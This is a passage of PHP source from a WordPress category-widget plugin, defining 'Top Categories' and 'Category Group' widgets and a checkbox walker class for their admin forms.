		echo '<input value="all" id="' . $this->get_field_id('post_category') . '" name="' . $this->get_field_name('post_category') . '[all]" type="checkbox" ' . (FALSE === $selected_cats ? ' CHECKED' : '') . '> ';
		_e('All Categories', 'avh-ec');
		echo '</label>';
		echo '</li>';
		ob_start();
		$this->avh_wp_category_checklist($selected_cats, $this->number);
		ob_end_flush();
		echo '</ul>';
		echo '</p>';

		echo '<p>';
		avh_doWidgetFormCheckbox($this->get_field_id('invert_included'), $this->get_field_name('invert_included'), __('Exclude the selected categories', 'avh-ec'), (bool) $instance['invert_included']);
		echo '</p>';

		echo '<input type="hidden" id="' . $this->get_field_id('submit') . '" name="' . $this->get_field_name('submit') . '" value="1" />';
	}

	/**
	 * Creates the categories checklist
	 *
	 * @param int $post_id
	 * @param int $descendants_and_self
	 * @param array $selected_cats
	 * @param array $popular_cats
	 * @param int $number
	 */
	function avh_wp_category_checklist ($selected_cats, $number)
	{

		$walker = new AVH_Walker_Category_Checklist();
		$walker->number = $number;
		$walker->input_id = $this->get_field_id('post_category');
		$walker->input_name = $this->get_field_name('post_category');
		$walker->li_id = $this->get_field_id('category--1');

		$args = array('taxonomy'=>'category', 'descendants_and_self'=>0, 'selected_cats'=>$selected_cats, 'popular_cats'=>array(), 'walker'=>$walker, 'checked_ontop'=>true, 'popular_cats'=>array());

		if (is_array($selected_cats))
			$args['selected_cats'] = $selected_cats;
		else
			$args['selected_cats'] = array();

		$categories = $this->core->getCategories();
		$_categories_id = $this->core->getCategoriesId($categories);

		// Post process $categories rather than adding an exclude to the get_terms() query to keep the query the same across all posts (for any query cache)
		$checked_categories = array();
		foreach ($args['selected_cats'] as $key => $value) {
			if (isset($_categories_id[$key])) {
				$category_key = $_categories_id[$key];
				$checked_categories[] = $categories[$category_key];
				unset($categories[$category_key]);
			}
		}

		// Put checked cats on top
		echo $walker->walk($checked_categories, 0, array ( $args ));
		// Then the rest of them
		echo $walker->walk($categories, 0, array ( $args ));
	}
}

/**
 * Widget Class for displaying the top categories
 *
 */
class WP_Widget_AVH_ExtendedCategories_Top extends WP_Widget
{
	/**
	 *
	 * @var AVH_EC_Core
	 */
	var $core;

	/**
	 * PHP 5 Constructor
	 *
	 */
	function __construct ()
	{
		$this->core = & AVH_EC_Singleton::getInstance('AVH_EC_Core');

		$widget_ops = array('description'=>__("Shows the top categories.", 'avh-ec'));
		WP_Widget::__construct(FALSE, 'AVH Extended Categories: '.__('Top Categories'), $widget_ops);
		add_action('wp_print_styles', array(&$this, 'actionWpPrintStyles'));

	}

	function WP_Widget_AVH_ExtendedCategories_Top ()
	{
		$this->__construct();
	}

	function actionWpPrintStyles ()
	{
		if (! (FALSE === is_active_widget(FALSE, FALSE, $this->id_base, TRUE))) {
			wp_register_style('avhec-widget', AVHEC_PLUGIN_URL . '/css/avh-ec.widget.css', array(), $this->core->version);
			wp_enqueue_style('avhec-widget');
		}
	}

	/** Echo the widget content.
	 *
	 * Subclasses should over-ride this function to generate their widget code.
	 *
	 * @param array $args Display arguments including before_title, after_title, before_widget, and after_widget.
	 * @param array $instance The settings for the particular instance of the widget
	 */
	function widget ($args, $instance)
	{
		extract($args);

		$title = apply_filters('widget_title', empty($instance['title']) ? __('Categories', 'avh-ec') : $instance['title']);
		$style = empty($instance['style']) ? 'list' : $instance['style'];
		if (! $a = (int) $instance['amount']) {
			$a = 5;
		} elseif ($a < 1) {
			$a = 1;
		}
		$c = $instance['count'] ? TRUE : FALSE;
		$use_desc_for_title = $instance['use_desc_for_title'] ? TRUE : FALSE;
		$s = $instance['sort_column'] ? $instance['sort_column'] : 'name';
		$o = $instance['sort_order'] ? $instance['sort_order'] : 'asc';
		$r = $instance['rssfeed'] ? 'RSS' : '';
		$i = $instance['rssimage'] ? $instance['rssimage'] : '';
		if (empty($r)) {
			$i = '';
		}
		if (! empty($i)) {
			if (! file_exists(ABSPATH . '/' . $i)) {
				$i = '';
			}
		}

		$options = $this->core->getOptions();
		$show_option_none = __('Select Category', 'avh-ec');
		if ($options['general']['alternative_name_select_category']) {
			$show_option_none = $options['general']['alternative_name_select_category'];
		}

		$top_cats = get_terms('category', array('fields'=>'ids', 'orderby'=>'count', 'order'=>'DESC', 'number'=>$a, 'hierarchical'=>FALSE));
		$included_cats = implode(",", $top_cats);

		$cat_args = array('include'=>$included_cats, 'orderby'=>$s, 'order'=>$o, 'show_count'=>$c, 'use_desc_for_title'=>$use_desc_for_title, 'hide_empty'=>FALSE, 'hierarchical'=>FALSE, 'depth'=>- 1, 'title_li'=>'', 'show_option_none'=>$show_option_none, 'feed'=>$r, 'feed_image'=>$i, 'name'=>'extended-categories-top-select-' . $this->number);
		echo $before_widget;
		echo $this->core->comment;
		echo $before_title . $title . $after_title;
		echo '<ul>';

		if ($style == 'list') {
			wp_list_categories($cat_args);
		} else {
			wp_dropdown_categories($cat_args);
			echo '<script type=\'text/javascript\'>' . "\n";
			echo '/* <![CDATA[ */' . "\n";
			echo '            var ec_dropdown_top_' . $this->number . ' = document.getElementById("extended-categories-top-select-' . $this->number . '");' . "\n";
			echo '            function ec_top_onCatChange_' . $this->number . '() {' . "\n";
			echo '                if ( ec_dropdown_top_' . $this->number . '.options[ec_dropdown_top_' . $this->number . '.selectedIndex].value > 0 ) {' . "\n";
			echo '                    location.href = "' . get_option('home') . '/?cat="+ec_dropdown_top_' . $this->number . '.options[ec_dropdown_top_' . $this->number . '.selectedIndex].value;' . "\n";
			echo '                }' . "\n";
			echo '            }' . "\n";
			echo '            ec_dropdown_top_' . $this->number . '.onchange = ec_top_onCatChange_' . $this->number . ';' . "\n";
			echo '/* ]]> */' . "\n";
			echo '</script>' . "\n";
		}
		echo '</ul>';
		echo $after_widget;
	}

	/** Update a particular instance.
	 *
	 * This function should check that $new_instance is set correctly.
	 * The newly calculated value of $instance should be returned.
	 * If "FALSE" is returned, the instance won't be saved/updated.
	 *
	 * @param array $new_instance New settings for this instance as input by the user via form()
	 * @param array $old_instance Old settings for this instance
	 * @return array Settings to save or bool FALSE to cancel saving
	 */
	function update ($new_instance, $old_instance)
	{
		// update the instance's settings
		if (! isset($new_instance['submit'])) {
			return FALSE;
		}

		$instance = $old_instance;

		$instance['title'] = strip_tags(stripslashes($new_instance['title']));
		$instance['amount'] = (int) $new_instance['amount'];
		$instance['count'] = $new_instance['count'] ? TRUE : FALSE;
		$instance['use_desc_for_title'] = $new_instance['use_desc_for_title'] ? TRUE : FALSE;
		$instance['sort_column'] = strip_tags(stripslashes($new_instance['sort_column']));
		$instance['sort_order'] = strip_tags(stripslashes($new_instance['sort_order']));
		$instance['style'] = strip_tags(stripslashes($new_instance['style']));
		$instance['rssfeed'] = $new_instance['rssfeed'] ? TRUE : FALSE;
		$instance['rssimage'] = strip_tags(stripslashes($new_instance['rssimage']));

		return $instance;
	}

	/** Echo the settings update form
	 *
	 * @param array $instance Current settings
	 */
	function form ($instance)
	{
		// displays the widget admin form
		$instance = wp_parse_args((array) $instance, array('title'=>'', 'rssimage'=>''));

		// Prepare data for display
		if (! $amount = (int) $instance['amount']) {
			$amount = 5;
		}

		if ($amount < 1) {
			$amount = 1;
		}
		echo '<p>';
		avh_doWidgetFormText($this->get_field_id('title'), $this->get_field_name('title'), __('Title', 'avh-ec'), $instance['title']);
		echo '</p>';

		echo '<p>';
		avh_doWidgetFormText($this->get_field_id('amount'), $this->get_field_name('amount'), __('How many categories to show', 'avh-ec'), $amount);
		echo '</p>';

		echo '<p>';
		avh_doWidgetFormCheckbox($this->get_field_id('count'), $this->get_field_name('count'), __('Show post counts', 'avh-ec'), (bool) $instance['count']);
		echo '<br />';

		avh_doWidgetFormCheckbox($this->get_field_id('use_desc_for_title'), $this->get_field_name('use_desc_for_title'), __('Use description for title', 'avh-ec'), (bool) $instance['use_desc_for_title']);
		echo '</p>';

		echo '<p>';
		$options['ID'] = __('ID', 'avh-ec');
		$options['name'] = __('Name', 'avh-ec');
		$options['count'] = __('Count', 'avh-ec');
		$options['slug'] = __('Slug', 'avh-ec');
		avh_doWidgetFormSelect($this->get_field_id('sort_column'), $this->get_field_name('sort_column'), __('Sort by', 'avh-ec'), $options, $instance['sort_column']);
		unset($options);

		$options['asc'] = __('Ascending', 'avh-ec');
		$options['desc'] = __('Descending', 'avh-ec');
		avh_doWidgetFormSelect($this->get_field_id('sort_order'), $this->get_field_name('sort_order'), __('Sort order', 'avh-ec'), $options, $instance['sort_order']);
		unset($options);

		$options['list'] = __('List', 'avh-ec');
		$options['drop'] = __('Drop down', 'avh-ec');
		avh_doWidgetFormSelect($this->get_field_id('style'), $this->get_field_name('style'), __('Display style', 'avh-ec'), $options, $instance['style']);
		unset($options);
		echo '</p>';

		echo '<p>';

		avh_doWidgetFormCheckbox($this->get_field_id('rssfeed'), $this->get_field_name('rssfeed'), __('Show RSS Feed', 'avh-ec'), (bool) $instance['rssfeed']);

		avh_doWidgetFormText($this->get_field_id('rssimage'), $this->get_field_name('rssimage'), __('Path (URI) to RSS image', 'avh-ec'), $instance['rssimage']);

		echo '</p>';

		echo '<input type="hidden" id="' . $this->get_field_id('submit') . '" name="' . $this->get_field_name('submit') . '" value="1" />';
	}
}

/**
 * Widget Class for displaying the grouped categories
 *
 */
class WP_Widget_AVH_ExtendedCategories_Category_Group extends WP_Widget
{
	/**
	 *
	 * @var AVH_EC_Core
	 */
	var $core;

	/**
	 *
	 * @var AVH_EC_Category_Group
	 */
	var $catgrp;

	/**
	 * PHP 5 Constructor
	 *
	 */
	function __construct ()
	{
		$this->core = & AVH_EC_Singleton::getInstance('AVH_EC_Core');
		$this->catgrp = & AVH_EC_Singleton::getInstance('AVH_EC_Category_Group');

		$widget_ops = array('description'=>__("Shows grouped categories.", 'avh-ec'));
		WP_Widget::__construct(FALSE, 'AVH Extended Categories: '.__('Category Group'), $widget_ops);
		add_action('wp_print_styles', array(&$this, 'actionWpPrintStyles'));

	}

	function WP_Widget_AVH_ExtendedCategories_Category_Group ()
	{
		$this->__construct();
	}

	function actionWpPrintStyles ()
	{
		if (! (FALSE === is_active_widget(FALSE, FALSE, $this->id_base, TRUE))) {
			wp_register_style('avhec-widget', AVHEC_PLUGIN_URL . '/css/avh-ec.widget.css', array(), $this->core->version);
			wp_enqueue_style('avhec-widget');
		}
	}

	/**
	 * Display the widget
	 *
	 * @param unknown_type $args
	 * @param unknown_type $instance
	 */
	function widget ($args, $instance)
	{
		global $post, $wp_query;

		$catgrp = & AVH_EC_Singleton::getInstance('AVH_EC_Category_Group');
		$options = $this->core->getOptions();

		$row = array();

		if (is_home()) {
			$special_page = 'home_group';
		} elseif (is_category()) {
			$special_page = 'category_group';
		} elseif (is_day()) {
			$special_page = 'day_group';
		} elseif (is_month()) {
			$special_page = 'month_group';
		} elseif (is_year()) {
			$special_page = 'year_group';
		} elseif (is_author()) {
			$special_page = 'author_group';
		} elseif (is_search()) {
			$special_page = 'search_group';
		} else {
			$special_page = 'none';
		}

		$toDisplay = FALSE;
		if ('none' == $special_page) {
			$terms = wp_get_object_terms($post->ID, $catgrp->taxonomy_name);
			if (! empty($terms)) {
				$selected_catgroups = unserialize($instance['post_group_category']);
				foreach ($terms as $key => $value) {
					if ($selected_catgroups === FALSE || array_key_exists($value->term_id, $selected_catgroups)) {
						if (! ($this->getWidgetDoneCatGroup($value->term_id))) {
							$row = $value;
							$group_found = TRUE;
							break;
						}
					}
				}
			} else {
				$options = $this->core->options;
				$no_cat_group = $options['cat_group']['no_group'];
				$row = get_term_by('id', $no_cat_group, $catgrp->taxonomy_name);
				$group_found = TRUE;
			}
		} else {
			if ('category_group' == $special_page) {
				$tax_meta = get_option($this->core->db_options_tax_meta);
				$term = $wp_query->get_queried_object();
				if (isset($tax_meta[$term->taxonomy][$term->term_id]['category_group_term_id'])) {
					$sp_category_group_id = $tax_meta[$term->taxonomy][$term->term_id]['category_group_term_id'];
				} else {
					$sp_category_group = $this->catgrp->getGroupByCategoryID($term->term_id);
					$sp_category_group_id = $sp_category_group->term_id;
				}
			} else {
				$sp_category_group_id = $options['sp_cat_group'][$special_page];
			}
			$row = get_term_by('id', $sp_category_group_id, $catgrp->taxonomy_name); // Returns FALSE when non-existance. (empty(FALSE)=TRUE)
			$group_found = TRUE;
		}

		if ($group_found) {
			$toDisplay = TRUE;
			$category_group_id_none = $this->catgrp->getTermIDBy('slug', 'none');
			$selected_catgroups = unserialize($instance['post_group_category']);

			if ($category_group_id_none == $row->term_id ) {
				$toDisplay = FALSE;
			} elseif (! (FALSE == $selected_catgroups || array_key_exists($row->term_id, $selected_catgroups))) {
				$toDisplay = FALSE;
			} elseif ($special_page != 'none' && $this->getWidgetDoneCatGroup($sp_category_group_id)) {
				$toDisplay = FALSE;
			}
		}

		if ($toDisplay) {
			extract($args);

			$c = $instance['count'] ? TRUE : FALSE;
			$e = $instance['hide_empty'] ? TRUE : FALSE;
			$h = $instance['hierarchical'] ? TRUE : FALSE;
			$use_desc_for_title = $instance['use_desc_for_title'] ? TRUE : FALSE;
			$s = $instance['sort_column'] ? $instance['sort_column'] : 'name';
			$o = $instance['sort_order'] ? $instance['sort_order'] : 'asc';
			$r = $instance['rssfeed'] ? 'RSS' : '';
			$i = $instance['rssimage'] ? $instance['rssimage'] : '';

			if (empty($r)) {
				$i = '';
			}

			$style = empty($instance['style']) ? 'list' : $instance['style'];
			$group_id = $row->term_id;
			$cats = $catgrp->getCategoriesFromGroup($group_id);
			if (empty($instance['title'])) {
				$title = $catgrp->getWidgetTitleForGroup($group_id);
				if (! $title) {
					$title = __('Categories', 'avh-ec');
				}
			} else {
				$title = $instance['title'];
			}
			$title = apply_filters('widget_title', $title);

			$included_cats = implode(',', $cats);

			$show_option_none = __('Select Category', 'avh-ec');
			if ($options['general']['alternative_name_select_category']) {
				$show_option_none = $options['general']['alternative_name_select_category'];
			}

			$cat_args = array('include'=>$included_cats, 'orderby'=>$s, 'order'=>$o, 'show_count'=>$c, 'use_desc_for_title'=>$use_desc_for_title, 'hide_empty'=>$e, 'hierarchical'=>$h, 'title_li'=>'', 'show_option_none'=>$show_option_none, 'feed'=>$r, 'feed_image'=>$i, 'name'=>'extended-categories-select-group-' . $this->number);
			echo $before_widget;
			echo $this->core->comment;
			echo $before_title . $title . $after_title;

			if ($style == 'list') {
				echo '<ul>';
				$this->core->avh_wp_list_categories($cat_args, TRUE);
				echo '</ul>';
			} else {
				$this->core->avh_wp_dropdown_categories($cat_args, TRUE);
				echo '<script type=\'text/javascript\'>' . "\n";
				echo '/* <![CDATA[ */' . "\n";
				echo '            var ec_dropdown_' . $this->number . ' = document.getElementById("extended-categories-select-group-' . $this->number . '");' . "\n";
				echo '            function ec_onCatChange_' . $this->number . '() {' . "\n";
				echo '                if ( ec_dropdown_' . $this->number . '.options[ec_dropdown_' . $this->number . '.selectedIndex].value > 0 ) {' . "\n";
				echo '                    location.href = "' . get_option('home') . '/?cat="+ec_dropdown_' . $this->number . '.options[ec_dropdown_' . $this->number . '.selectedIndex].value;' . "\n";
				echo '                }' . "\n";
				echo '            }' . "\n";
				echo '            ec_dropdown_' . $this->number . '.onchange = ec_onCatChange_' . $this->number . ';' . "\n";
				echo '/* ]]> */' . "\n";
				echo '</script>' . "\n";
			}
			echo $after_widget;
		}
	}

	/**
	 * When Widget Control Form Is Posted
	 *
	 * @param unknown_type $new_instance
	 * @param unknown_type $old_instance
	 * @return unknown
	 */
	function update ($new_instance, $old_instance)
	{
		// update the instance's settings
		if (! isset($new_instance['submit'])) {
			return FALSE;
		}

		$instance = $old_instance;

		$instance['title'] = strip_tags(stripslashes($new_instance['title']));
		$instance['count'] = $new_instance['count'] ? TRUE : FALSE;
		$instance['hierarchical'] = $new_instance['hierarchical'] ? TRUE : FALSE;
		$instance['hide_empty'] = $new_instance['hide_empty'] ? TRUE : FALSE;
		$instance['use_desc_for_title'] = $new_instance['use_desc_for_title'] ? TRUE : FALSE;
		$instance['sort_column'] = strip_tags(stripslashes($new_instance['sort_column']));
		$instance['sort_order'] = strip_tags(stripslashes($new_instance['sort_order']));
		$instance['style'] = strip_tags(stripslashes($new_instance['style']));
		$instance['rssfeed'] = $new_instance['rssfeed'] ? TRUE : FALSE;
		$instance['rssimage'] = strip_tags(stripslashes($new_instance['rssimage']));
		if (array_key_exists('all', $new_instance['post_group_category'])) {
			$instance['post_group_category'] = FALSE;
		} else {
			$instance['post_group_category'] = serialize($new_instance['post_group_category']);
		}
		return $instance;
	}

	/**
	 * Display Widget Control Form
	 *
	 * @param unknown_type $instance
	 */
	function form ($instance)
	{
		// displays the widget admin form
		$instance = wp_parse_args((array) $instance, array('title'=>'', 'rssimage'=>''));

		// Prepare data for display
		$title = esc_attr($instance['title']);
		$count = (bool) $instance['count'];
		$hierarchical = (bool) $instance['hierarchical'];
		$hide_empty = (bool) $instance['hide_empty'];
		$use_desc_for_title = (bool) $instance['use_desc_for_title'];
		$sort_id = ($instance['sort_column'] == 'ID') ? ' SELECTED' : '';
		$sort_name = ($instance['sort_column'] == 'name') ? ' SELECTED' : '';
		$sort_count = ($instance['sort_column'] == 'count') ? ' SELECTED' : '';
		$sort_order_a = ($instance['sort_order'] == 'asc') ? ' SELECTED' : '';
		$sort_order_d = ($instance['sort_order'] == 'desc') ? ' SELECTED' : '';
		$style_list = ($instance['style'] == 'list') ? ' SELECTED' : '';
		$style_drop = ($instance['style'] == 'drop') ? ' SELECTED' : '';
		$rssfeed = (bool) $instance['rssfeed'];
		$rssimage = esc_attr($instance['rssimage']);

		$selected_cats = ($instance['post_group_category'] != '') ? unserialize($instance['post_group_category']) : FALSE;
		ob_start();
		echo '<p>';
		avh_doWidgetFormText($this->get_field_id('title'), $this->get_field_name('title'), __('Title', 'avh-ec'), $instance['title']);
		echo '</p>';

		echo '<p>';

		avh_doWidgetFormCheckbox($this->get_field_id('count'), $this->get_field_name('count'), __('Show post counts', 'avh-ec'), (bool) $instance['count']);

		avh_doWidgetFormCheckbox($this->get_field_id('hierarchical'), $this->get_field_name('hierarchical'), __('Show hierarchy', 'avh-ec'), (bool) $instance['hierarchical']);

		avh_doWidgetFormCheckbox($this->get_field_id('hide_empty'), $this->get_field_name('hide_empty'), __('Hide empty categories', 'avh-ec'), (bool) $instance['hide_empty']);

		avh_doWidgetFormCheckbox($this->get_field_id('use_desc_for_title'), $this->get_field_name('use_desc_for_title'), __('Use description for title', 'avh-ec'), (bool) $instance['use_desc_for_title']);
		echo '</p>';

		echo '<p>';
		$options['ID'] = __('ID', 'avh-ec');
		$options['name'] = __('Name', 'avh-ec');
		$options['count'] = __('Count', 'avh-ec');
		$options['slug'] = __('Slug', 'avh-ec');
		avh_doWidgetFormSelect($this->get_field_id('sort_column'), $this->get_field_name('sort_column'), __('Sort by', 'avh-ec'), $options, $instance['sort_column']);
		unset($options);

		$options['asc'] = __('Ascending', 'avh-ec');
		$options['desc'] = __('Descending', 'avh-ec');
		avh_doWidgetFormSelect($this->get_field_id('sort_order'), $this->get_field_name('sort_order'), __('Sort order', 'avh-ec'), $options, $instance['sort_order']);
		unset($options);

		$options['list'] = __('List', 'avh-ec');
		$options['drop'] = __('Drop down', 'avh-ec');
		avh_doWidgetFormSelect($this->get_field_id('style'), $this->get_field_name('style'), __('Display style', 'avh-ec'), $options, $instance['style']);
		unset($options);
		echo '</p>';

		echo '<p>';

		avh_doWidgetFormCheckbox($this->get_field_id('rssfeed'), $this->get_field_name('rssfeed'), __('Show RSS Feed', 'avh-ec'), (bool) $instance['rssfeed']);

		avh_doWidgetFormText($this->get_field_id('rssimage'), $this->get_field_name('rssimage'), __('Path (URI) to RSS image', 'avh-ec'), $instance['rssimage']);
		echo '</p>';

		echo '<p>';
		echo '<b>' . __('Select Groups', 'avh-ec') . '</b><hr />';
		echo '<ul id="categorychecklist" class="list:category categorychecklist form-no-clear" style="list-style-type: none; margin-left: 5px; padding-left: 0px; margin-bottom: 20px;">';
		echo '<li id="' . $this->get_field_id('group_category--1') . '" class="popular-group_category">';
		echo '<label for="' . $this->get_field_id('group_post_category') . '" class="selectit">';
		echo '<input value="all" id="' . $this->get_field_id('group_post_category') . '" name="' . $this->get_field_name('post_group_category') . '[all]" type="checkbox" ' . (FALSE === $selected_cats ? ' CHECKED' : '') . '> ';
		_e('Any Group', 'avh-ec');
		echo '</label>';
		echo '</li>';

		$this->avh_wp_group_category_checklist($selected_cats, $this->number);

		echo '</ul>';
		echo '</p>';

		echo '<input type="hidden" id="' . $this->get_field_id('submit') . '" name="' . $this->get_field_name('submit') . '" value="1" />';
		ob_end_flush();
	}

	function avh_wp_group_category_checklist ($selected_cats, $number)
	{

		$walker = new AVH_Walker_Category_Checklist();
		$walker->number = $number;
		$walker->input_id = $this->get_field_id('post_group_category');
		$walker->input_name = $this->get_field_name('post_group_category');
		$walker->li_id = $this->get_field_id('group_category--1');

		$args = array('taxonomy'=>'avhec_catgroup', 'descendants_and_self'=>0, 'selected_cats'=>array(), 'popular_cats'=>array(), 'walker'=>$walker, 'checked_ontop'=>true);

		if (is_array($selected_cats))
			$args['selected_cats'] = $selected_cats;
		else
			$args['selected_cats'] = array();

		$categories = (array) get_terms($args['taxonomy'], array('get'=>'all'));

		// Post process $categories rather than adding an exclude to the get_terms() query to keep the query the same across all posts (for any query cache)
		$checked_categories = array();
		$keys = array_keys($categories);

		foreach ($keys as $k) {
			if (in_array($categories[$k]->term_id, $args['selected_cats'])) {
				$checked_categories[] = $categories[$k];
				unset($categories[$k]);
			}
		}

		// Put checked cats on top
		echo $walker->walk($checked_categories, 0, array ( $args ));
		// Then the rest of them
		echo $walker->walk($categories, 0, array ( $args ));
	}

	function getWidgetDoneCatGroup ($id)
	{
		$catgrp = & AVH_EC_Singleton::getInstance('AVH_EC_Category_Group');
		if (is_array($catgrp->widget_done_catgroup) && array_key_exists($id, $catgrp->widget_done_catgroup)) {
			return TRUE;
		}
		$catgrp->widget_done_catgroup[$id] = TRUE;
		return FALSE;
	}
}

/**
 * Class that will display the categories
 *
 */
class AVH_Walker_Category_Checklist extends Walker
{
	var $tree_type = 'category';
	var $db_fields = array('parent'=>'parent', 'id'=>'term_id'); //TODO: decouple this
	var $number;
	var $input_id;
	var $input_name;
	var $li_id;

	/**
	 * Display array of elements hierarchically.
	 *
	 * It is a generic function which does not assume any existing order of
	 * elements. max_depth = -1 means flatly display every element. max_depth =
	 * 0 means display all levels. max_depth > 0  specifies the number of
	 * display levels.
	 *
	 * @since 2.1.0
	 *
	 * @param array $elements
	 * @param int $max_depth
	 * @param array $args;
	 * @return string
	 */
	function walk( $elements, $max_depth, $args) {

		$output = '';

		if ($max_depth < -1) //invalid parameter
			return $output;

		if (empty($elements)) //nothing to walk
			return $output;

		$id_field = $this->db_fields['id'];
		$parent_field = $this->db_fields['parent'];

		// flat display
		if ( -1 == $max_depth ) {
			$empty_array = array();
			foreach ( $elements as $e )
				$this->display_element( $e, $empty_array, 1, 0, $args, $output );
			return $output;
		}

		/*
		 * need to display in hierarchical order
		 * separate elements into two buckets: top level and children elements
		 * children_elements is two dimensional array, eg.
		 * children_elements[10][] contains all sub-elements whose parent is 10.
		 */
		$top_level_elements = array();
		$children_elements  = array();
		foreach ( $elements as $e) {
			if ( 0 == $e->$parent_field )
				$top_level_elements[] = $e;
			else
				$children_elements[ $e->$parent_field ][] = $e;
		}

		/*
		 * when none of the elements is top level
		 * assume the first one must be root of the sub elements
		 */
		if ( empty($top_level_elements) ) {

			$first = array_slice( $elements, 0, 1 );
			$root = $first[0];

			$top_level_elements = array();
			$children_elements  = array();
			foreach ( $elements as $e) {
				if ( $root->$parent_field == $e->$parent_field )
					$top_level_elements[] = $e;
				else
					$children_elements[ $e->$parent_field ][] = $e;
			}
		}

		foreach ( $top_level_elements as $e )
			$this->display_element( $e, $children_elements, $max_depth, 0, $args, $output );

		/*
		 * if we are displaying all levels, and remaining children_elements is not empty,
		 * then we got orphans, which should be displayed regardless
		 */
		if ( ( $max_depth == 0 ) && count( $children_elements ) > 0 ) {
			$empty_array = array();
			foreach ( $children_elements as $orphans )
				foreach( $orphans as $op )
					$this->display_element( $op, $empty_array, 1, 0, $args, $output );
		 }

		 return $output;
	}
	function start_lvl (&$output, $depth, $args)
	{
		$indent = str_repeat("\t", $depth);
		$output .= $indent . '<ul class="children">' . "\n";
	}

	function end_lvl (&$output, $depth, $args)
	{
		$indent = str_repeat("\t", $depth);
		$output .= $indent . '</ul>' . "\n";
	}

	function start_el (&$output, $category, $depth, $args)
	{
		extract($args);
		$input_id = $this->input_id . '-' . $category->term_id;
		$output .= "\n" . '<li id="' . $this->li_id . '">';
		$output .= '<label for="' . $input_id . '" class="selectit">';
		$output .= '<input value="' . $category->term_id . '" type="checkbox" name="' . $this->input_name . '[' . $category->term_id . ']" id="' . $input_id . '"' . (in_array($category->term_id, $selected_cats) ? ' checked="checked"' : "") . '/> ' . wp_specialchars(apply_filters('the_category', $category->name)) . '</label>';
	}

	function end_el (&$output, $category, $depth, $args)
	{
		$output .= "</li>\n";
	}
}
?>